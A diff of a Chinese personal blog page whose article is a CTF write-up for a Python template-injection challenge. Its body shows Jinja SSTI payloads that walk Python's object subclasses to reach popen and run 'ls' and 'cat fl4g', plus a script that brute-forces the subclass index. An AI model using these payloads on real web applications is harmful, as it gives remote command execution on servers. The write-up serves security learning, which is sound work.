@@ -19,10 +19,20 @@
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
     <meta name="mobile-web-app-capable" content="yes">
     <meta name="format-detection" content="telephone=no">
+    <meta name="referrer" content="no-referrer-when-downgrade">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="referrer" content="no-referrer-when-downgrade">
     <!-- Global site tag (gtag.js) - Google Analytics -->
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-BYTY196ENH"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+    
+      gtag('config', 'G-BYTY196ENH');
+    </script>
 
 
     <title>攻防世界-Web_python_template_injection | hybcx&#39;s blog</title>
@@ -268,7 +278,7 @@
         
         <li><div class="divider"></div></li>
         <li>
-            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+            <a href="https://github.com/hybchenxing/" class="waves-effect waves-light" target="_blank">
                 <i class="fab fa-github-square fa-fw"></i>Fork Me
             </a>
         </li>
@@ -325,7 +335,7 @@
     }
 </style>
 
-<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+<a href="https://github.com/hybchenxing/" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
    data-tooltip="Fork Me" data-position="left" data-delay="50">
     <svg viewBox="0 0 250 250" aria-hidden="true">
         <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
@@ -420,11 +430,6 @@
                 
 
                 
-                    <div id="busuanzi_container_page_pv" class="info-break-policy">
-                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
-                        <span id="busuanzi_value_page_pv"></span>
-                    </div>
-				
             </div>
         </div>
         <hr class="clearfix">
@@ -441,14 +446,14 @@
                 <h2 id="题目描述：">题目描述：</h2>
 <p>无</p>
 <h2 id="题目解题：">题目解题：</h2>
-<p><img src="/2023/08/08/web-python-template-injection/image-20230808151049050.png" alt="image-20230808151049050"></p>
+<p><img src="image-20230808151049050.png" alt="image-20230808151049050"></p>
 <p>看到该页面，毫无疑问就是python的ssti注入了，那我们抓包看一下</p>
 <p>在这里看到页面也没有注入的地方，就想着现在url后面直接加上模板看看</p>
-<p><img src="/2023/08/08/web-python-template-injection/image-20230808151514370.png" alt="image-20230808151514370"></p>
+<p><img src="image-20230808151514370.png" alt="image-20230808151514370"></p>
 <p>如上图，成功证明存在ssti漏洞</p>
 <p>那我们先取object这个类，随后在列举出其所有子类（这里我是先看了看第400个以后的元素）</p>
-<p><img src="/2023/08/08/web-python-template-injection/image-20230808151822400.png" alt="image-20230808151822400"></p>
-<p><img src="/2023/08/08/web-python-template-injection/image-20230808151940564.png" alt="image-20230808151940564"></p>
+<p><img src="image-20230808151822400.png" alt="image-20230808151822400"></p>
+<p><img src="image-20230808151940564.png" alt="image-20230808151940564"></p>
 <p>这里又找到一个popen命令函数，那我们在定位一下，这里采用如下payload</p>
 <pre class="line-numbers language-none"><code class="language-none">{{().__class__.__bases__[0].__subclasses__()}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>直接上脚本找</p>
@@ -465,14 +470,14 @@ headers <span class="token operator">=</span> <span class="token punctuation">{<
     <span class="token keyword">if</span> <span class="token string">'popen'</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
         <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>找到237，定位一下看看</p>
-<p><img src="/2023/08/08/web-python-template-injection/image-20230808155345694.png" alt="image-20230808155345694"></p>
+<p><img src="image-20230808155345694.png" alt="image-20230808155345694"></p>
 <p>成功定位，那直接传参数ls，payload如下</p>
 <pre class="line-numbers language-none"><code class="language-none">{{().__class__.__bases__[0].__subclasses__()[237]("ls",shell=True,stdout=-1).communicate()}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>详细使用方法可以参考Python手册，这里communicate函数作用是将命令执行后的内容输出出来</p>
-<p><img src="/2023/08/08/web-python-template-injection/image-20230808155913256.png" alt="image-20230808155913256"></p>
+<p><img src="image-20230808155913256.png" alt="image-20230808155913256"></p>
 <p>找到flag，cat读一下看看</p>
 <pre class="line-numbers language-none"><code class="language-none">{{().__class__.__bases__[0].__subclasses__()[237]("cat fl4g",shell=True,stdout=-1).communicate()}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2023/08/08/web-python-template-injection/image-20230808160002527.png" alt="image-20230808160002527"></p>
+<p><img src="image-20230808160002527.png" alt="image-20230808160002527"></p>
 <p>成功</p>
 
                 
@@ -564,7 +569,7 @@ headers <span class="token operator">=</span> <span class="token punctuation">{<
     <div id="rewardModal" class="modal">
         <div class="modal-content">
             <a class="close modal-close"><i class="fas fa-times"></i></a>
-            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <h4 class="reward-title">随缘，看各位佬的心情</h4>
             <div class="reward-content">
                 <div class="reward-tabs">
                     <ul class="tabs row">
@@ -572,7 +577,7 @@ headers <span class="token operator">=</span> <span class="token punctuation">{<
                         <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                     </ul>
                     <div id="alipay">
-                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                        <img src="/medias/reward/alipay.png" class="reward-img" alt="支付宝打赏二维码">
                     </div>
                     <div id="wechat">
                         <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
@@ -852,12 +857,12 @@ headers <span class="token operator">=</span> <span class="token punctuation">{<
 <script>
     new Valine({
         el: '#vcomments',
-        appId: 'fYyLqrwhVuigWcIYcP9sPbBv-MdYXbMMI',
-        appKey: 'ht8iOzVaHwm0miBUeumGrxDF',
-        serverURLs: '',
+        appId: 'u0n6SeKEfoilg30pN4VxouXR-MdYXbMMI',
+        appKey: '36SdcVNDUm7oJBLF0OpXO4ut',
+        serverURLs: 'https://u0n6seke.api.lncldglobal.com',
         notify: 'false' === 'true',
         verify: 'false' === 'true',
-        visitor: 'true' === 'true',
+        visitor: 'false' === 'true',
         avatar: 'mm',
         pageSize: '10',
         lang: 'zh-cn',
@@ -986,6 +991,8 @@ headers <span class="token operator">=</span> <span class="token punctuation">{<
 
 <!-- 代码块收缩 -->
 
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
 
 
     </div>
@@ -1013,8 +1020,8 @@ headers <span class="token operator">=</span> <span class="token punctuation">{<
             tocSelector: '#toc-content',
             contentSelector: '#articleContent',
             headingsOffset: -($(window).height() * 0.4 - 45),
-            collapseDepth: Number('0'),
-            headingSelector: 'h2, h3, h4'
+            collapseDepth: Number('3'),
+            headingSelector: 'h2, h3, h4, h5, h6'
         });
 
         // Set scroll toc fixed.
@@ -1097,8 +1104,6 @@ headers <span class="token operator">=</span> <span class="token punctuation">{<
             
             
             
-                
-            
             
                 <span id="busuanzi_container_site_pv">
                 &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
@@ -1118,24 +1123,28 @@ headers <span class="token operator">=</span> <span class="token punctuation">{<
             <br>
             
         </div>
-        <div class="col s12 m4 l4 social-link social-statis">
-    <a href="https://github.com/blinkfox" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <div class="col s12 m4 l4 social-link ">
+    <a href="https://github.com/hybchenxing/" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
         <i class="fab fa-github"></i>
     </a>
 
 
 
-    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+    <a href="mailto:2235199080@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
         <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+    <a href="https://www.facebook.com/profile.php?id=61555427038857" class="tooltipped" target="_blank" data-tooltip="关注我的Facebook: https://www.facebook.com/profile.php?id=61555427038857" data-position="top" data-delay="50">
+        <i class="fab fa-facebook-f"></i>
     </a>
 
 
 
 
 
-
-
-    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2235199080" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2235199080" data-position="top" data-delay="50">
         <i class="fab fa-qq"></i>
     </a>
 
@@ -1347,8 +1356,6 @@ $(function () {
     
     <script src="/libs/others/clicklove.js" async="async"></script>
     
-    
-    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
     
 
     
